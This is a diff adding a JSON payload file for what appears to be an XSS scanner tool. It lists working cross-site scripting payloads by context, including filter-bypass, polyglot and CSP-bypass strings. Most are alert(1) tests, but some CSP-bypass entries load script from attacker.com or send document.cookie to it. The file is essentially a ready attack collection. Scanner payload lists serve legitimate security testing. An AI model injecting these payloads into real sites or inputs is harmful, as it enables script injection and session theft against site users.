@@ -1,0 +1,197 @@
+{
+  "metadata": {
+    "name": "XSS Payloads",
+    "version": "1.0.0",
+    "description": "Comprehensive XSS payload collection for REVUEX XSS Scanner GOLD",
+    "author": "REVUEX Team"
+  },
+  "basic": {
+    "description": "Basic XSS payloads for initial detection",
+    "payloads": [
+      "<script>alert(1)</script>",
+      "<script>alert('XSS')</script>",
+      "<script>alert(document.domain)</script>",
+      "<script>alert(document.cookie)</script>",
+      "<img src=x onerror=alert(1)>",
+      "<svg onload=alert(1)>",
+      "<body onload=alert(1)>",
+      "<iframe src=\"javascript:alert(1)\">",
+      "<a href=\"javascript:alert(1)\">click</a>",
+      "<input onfocus=alert(1) autofocus>",
+      "<marquee onstart=alert(1)>",
+      "<video><source onerror=alert(1)>",
+      "<audio src=x onerror=alert(1)>",
+      "<details open ontoggle=alert(1)>",
+      "<math><maction actiontype=\"statusline#http://evil.com\" xlink:href=\"javascript:alert(1)\">click"
+    ]
+  },
+  "attribute_injection": {
+    "description": "Attribute context XSS payloads",
+    "payloads": [
+      "\" onmouseover=\"alert(1)",
+      "' onmouseover='alert(1)",
+      "\" onfocus=\"alert(1)\" autofocus=\"",
+      "' onfocus='alert(1)' autofocus='",
+      "\" onclick=\"alert(1)",
+      "\" onload=\"alert(1)",
+      "\"><script>alert(1)</script>",
+      "'><script>alert(1)</script>",
+      "\" style=\"background:url(javascript:alert(1))",
+      "\" onmouseenter=\"alert(1)",
+      "\" onmousemove=\"alert(1)",
+      "\" onerror=\"alert(1)\" src=\"x",
+      "\"><img src=x onerror=alert(1)>",
+      "'-alert(1)-'",
+      "\"-alert(1)-\""
+    ]
+  },
+  "javascript_context": {
+    "description": "JavaScript context XSS payloads",
+    "payloads": [
+      "';alert(1)//",
+      "\";alert(1)//",
+      "';alert(1);'",
+      "\";alert(1);\"",
+      "</script><script>alert(1)</script>",
+      "'-alert(1)-'",
+      "\\';alert(1)//",
+      "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+      "${alert(1)}",
+      "{{constructor.constructor('alert(1)')()}}",
+      "javascript:alert(1)",
+      "data:text/html,<script>alert(1)</script>",
+      "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
+    ]
+  },
+  "html_entities": {
+    "description": "HTML entity encoded payloads",
+    "payloads": [
+      "&lt;script&gt;alert(1)&lt;/script&gt;",
+      "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
+      "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+      "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",
+      "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)\">click</a>"
+    ]
+  },
+  "url_encoded": {
+    "description": "URL encoded payloads",
+    "payloads": [
+      "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "%27%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
+      "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
+      "%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B"
+    ]
+  },
+  "filter_bypass": {
+    "description": "Filter bypass payloads",
+    "payloads": [
+      "<ScRiPt>alert(1)</ScRiPt>",
+      "<scr<script>ipt>alert(1)</scr</script>ipt>",
+      "<script/src=data:,alert(1)>",
+      "<script>alert`1`</script>",
+      "<svg/onload=alert(1)>",
+      "<svg onload=alert(1)//",
+      "<img src=x onerror=alert(1)//>",
+      "<img src=x onerror=\"alert(1)\"",
+      "<img/src=x onerror=alert(1)>",
+      "<img src=x\tonerror=alert(1)>",
+      "<img src=x\nonerror=alert(1)>",
+      "<img src=x\ronerror=alert(1)>",
+      "<<script>alert(1)//<</script>",
+      "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "<script>eval(atob('YWxlcnQoMSk='))</script>",
+      "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"
+    ]
+  },
+  "dom_based": {
+    "description": "DOM-based XSS payloads",
+    "payloads": [
+      "#<script>alert(1)</script>",
+      "#\"><img src=x onerror=alert(1)>",
+      "javascript:alert(1)",
+      "data:text/html,<script>alert(1)</script>",
+      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+      "#<img/src/onerror=alert(1)>",
+      "?search=<script>alert(1)</script>",
+      "?redirect=javascript:alert(1)"
+    ]
+  },
+  "svg_xss": {
+    "description": "SVG-based XSS payloads",
+    "payloads": [
+      "<svg onload=alert(1)>",
+      "<svg/onload=alert(1)>",
+      "<svg onload=\"alert(1)\">",
+      "<svg><script>alert(1)</script></svg>",
+      "<svg><animate onbegin=alert(1)>",
+      "<svg><set onbegin=alert(1)>",
+      "<svg><handler onclick=alert(1)>",
+      "<svg><a xlink:href=\"javascript:alert(1)\"><rect width=\"100\" height=\"100\"/></a></svg>",
+      "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>"
+    ]
+  },
+  "event_handlers": {
+    "description": "Event handler payloads",
+    "payloads": [
+      "onmouseover=alert(1)",
+      "onfocus=alert(1)",
+      "onclick=alert(1)",
+      "onerror=alert(1)",
+      "onload=alert(1)",
+      "onmouseenter=alert(1)",
+      "onmouseleave=alert(1)",
+      "onmouseout=alert(1)",
+      "onmouseup=alert(1)",
+      "onmousedown=alert(1)",
+      "onkeydown=alert(1)",
+      "onkeyup=alert(1)",
+      "onkeypress=alert(1)",
+      "onchange=alert(1)",
+      "onsubmit=alert(1)",
+      "onreset=alert(1)",
+      "onselect=alert(1)",
+      "onblur=alert(1)",
+      "ondblclick=alert(1)",
+      "ondrag=alert(1)",
+      "ondragend=alert(1)",
+      "ondragenter=alert(1)",
+      "ondragleave=alert(1)",
+      "ondragover=alert(1)",
+      "ondragstart=alert(1)",
+      "ondrop=alert(1)",
+      "oninput=alert(1)",
+      "oninvalid=alert(1)",
+      "onscroll=alert(1)",
+      "ontoggle=alert(1)",
+      "onwheel=alert(1)",
+      "onanimationend=alert(1)",
+      "onanimationiteration=alert(1)",
+      "onanimationstart=alert(1)",
+      "ontransitionend=alert(1)"
+    ]
+  },
+  "polyglots": {
+    "description": "Polyglot XSS payloads that work in multiple contexts",
+    "payloads": [
+      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+      "'\">--><svg/onload=alert(1)>",
+      "'\"><script>alert(1)</script>",
+      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+      "-->'\"</Style></Script><svg/onload=alert(1)>",
+      "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
+    ]
+  },
+  "csp_bypass": {
+    "description": "Content Security Policy bypass payloads",
+    "payloads": [
+      "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js\"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
+      "<script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js\"></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
+      "<base href=\"https://attacker.com/\"><script src=\"/evil.js\"></script>",
+      "<object data=\"data:text/html,<script>alert(1)</script>\">",
+      "<link rel=\"prefetch\" href=\"https://attacker.com/?cookie=\"+document.cookie>"
+    ]
+  }
+}
